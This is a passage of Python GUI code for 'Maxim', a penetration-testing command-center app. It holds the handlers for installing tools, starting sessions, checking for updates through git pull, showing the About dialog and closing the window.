    def _install_all_tools(self):
        pkgs = get_all_packages()
        self._execute_command(f"sudo apt-get install -y {' '.join(pkgs)}")

    def _new_session(self):
        self.session = Session()
        self.terminal.clear()
        self.cmd_count_label.setText("0 commands")

    def _check_updates(self):
        info = check_for_update()
        if info["available"]:
            reply = QMessageBox.question(
                self, "Update Available",
                f"Maxim v{info['latest']} available (you have v{info['current']}).\n\nUpdate now?",
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.Yes:
                self._execute_command(f"cd {os.path.dirname(os.path.dirname(os.path.abspath(__file__)))} && git pull origin main")
        else:
            QMessageBox.information(self, "Up to Date", f"Maxim v{info['current']} is the latest.")

    def _show_about(self):
        ver = get_current_version()
        QMessageBox.about(self, "About Maxim",
            f"<h2 style='color:#3b82f6;'>MAXIM v{ver}</h2>"
            "<p>Penetration Testing Command Center</p>"
            "<p>Type what you want. Maxim picks the tool and runs it.</p>"
        )

    def closeEvent(self, event):
        self.runner.kill_all()
        event.accept()
